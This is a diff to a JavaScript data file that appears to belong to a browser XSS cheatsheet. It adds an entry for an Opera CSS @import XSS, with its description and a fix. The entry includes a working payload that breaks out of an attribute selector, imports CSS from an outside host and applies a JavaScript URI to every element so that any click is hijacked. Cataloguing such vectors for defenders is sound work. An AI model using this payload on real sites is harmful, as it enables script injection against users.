@@ -1298,7 +1298,7 @@ var items =
         'tags'       : ['xss', 'javascript', 'opera', 'internet explorer', 'base', 'hijacking'],
         'reporter'   : 'brainpillow, Gareth, LeverOne, .mario'
     },
-   { /* ID 43 - Opera 10 SVG font XSS  */
+    { /* ID 43 - Opera 10 SVG font XSS  */
         'id'         : 43,
         'category'   : 'font', 
         'name'       : {
@@ -1332,6 +1332,42 @@ var items =
             'opera': ['10.0'],
         },
         'tags'       : ['xss', 'javascript', 'opera', 'svg', 'font', 'svgfont'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 44 - Opera @import based XSS inside attribute selectors  */
+        'id'         : 44,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'Opera @import based XSS inside attribute selectors',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<style>*[{}@import\'http://heideri.ch/jso/test.css?]</style>X',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test.css',
+            'name'          : 'test.css',
+            'raw'           : '* {-o-link:\'%js_uri_alert%\';-o-link-source: current;}'
+        },
+        'description': {
+            'en' : 'Opera 10 and later version including latest Opera 10.5 allow breaking out an attribute selector with {} and use @import declarations afterwards. The MIME type for the imported file does not matter - also it can be loaded from arbitrary domains. The imported file contains CSS code to apply a JavaScript URI to all elements on the page to hijack any incoming click.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : 'Make sure in user submitted CSS the contents of attribute selectors are properly escaped with backslashes. Also make sure to use a CSS property:value whitelist to forbid properties like -o-link and -o-link-source.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'opera': ['8.0', '9.0', '10.0', '10.5'],
+        },
+        'tags'       : ['xss', 'javascript', 'opera', 'css', 'hijacking', 'proprietary'],
         'reporter'   : '.mario'
     }
 ]
